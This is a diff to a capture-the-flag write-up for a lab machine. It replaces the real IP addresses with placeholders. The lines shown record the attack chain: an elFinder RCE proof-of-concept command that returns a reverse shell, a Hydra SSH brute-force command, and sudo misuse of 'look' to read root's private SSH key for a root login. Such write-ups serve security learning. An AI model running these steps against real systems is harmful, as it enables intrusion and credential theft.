@@ -101,7 +101,7 @@ Exploitation was done using this PoC:
 https://github.com/hadrian3689/elFinder_2.1.47_php_connector_rce
 
 ```bash
-python3 elfinder.py -t http://files.lookup.thm/elFinder/ -lh 10.9.0.89 -lp 4305
+python3 elfinder.py -t http://files.lookup.thm/elFinder/ -lh <lhost> -lp 4305
 ```
 
 This gave a reverse shell as `www-data`.
@@ -138,7 +138,7 @@ Running `pwm` now reads the file `/home/think/.passwords`, which contained a lon
 Bruteforcing with Hydra:
 
 ```bash
-hydra -l think -P lookup.txt ssh://10.10.102.13
+hydra -l think -P lookup.txt ssh://<target ip>
 ```
 
 - Valid credentials found: `think:REDACTED`
@@ -170,7 +170,7 @@ sudo look "" /root/.ssh/id_rsa
 Found a full private SSH key. Saved it, set correct permissions, and logged in as root:
 
 ```bash
-ssh -i lookup_id root@10.10.87.108
+ssh -i lookup_id root@[target ip]
 ```
 
 Root flag retrieved from `/root/root.txt`.
